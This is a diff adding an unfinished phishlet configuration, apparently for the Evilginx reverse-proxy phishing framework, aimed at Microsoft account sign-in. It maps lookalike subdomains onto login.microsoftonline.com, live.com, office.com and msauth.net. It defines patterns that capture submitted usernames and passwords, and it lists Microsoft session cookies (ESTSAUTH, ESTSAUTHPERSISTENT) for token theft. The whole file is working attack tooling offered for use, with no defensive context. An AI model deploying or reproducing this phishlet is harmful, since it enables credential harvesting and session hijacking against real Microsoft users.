@@ -1,0 +1,28 @@
+#TBA - Still in progress - this phishlet is for the "onmicrosoft" accounts etc
+min_ver: '3.0.0'
+proxy_hosts:
+  - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: true }
+  - { phish_sub: "acc", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "www", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "log", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "account", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: true }
+  - { phish_sub: "outlook", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false, auto_filter: true }
+  - {phish_sub: 'cdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false}
+
+auth_tokens:
+#  - domain: '.login.microsoftonline.com'
+#    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+credentials:
+  username:
+    key: '(login|UserName)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password|accesspass)'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.live.com'
+  path: '/'
+auth_urls:
+  - '/complete-client-signin-oauth'
